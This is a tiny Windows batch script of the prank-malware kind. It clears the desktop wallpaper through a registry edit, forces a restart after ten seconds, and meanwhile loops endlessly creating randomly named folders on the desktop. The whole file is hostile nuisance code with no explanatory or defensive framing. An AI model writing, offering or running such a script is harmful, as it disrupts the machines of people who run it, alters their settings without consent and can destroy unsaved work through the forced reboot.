@echo off
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
shutdown /r /t 10
:0
md "%userprofile%\Desktop\%random%"
goto 0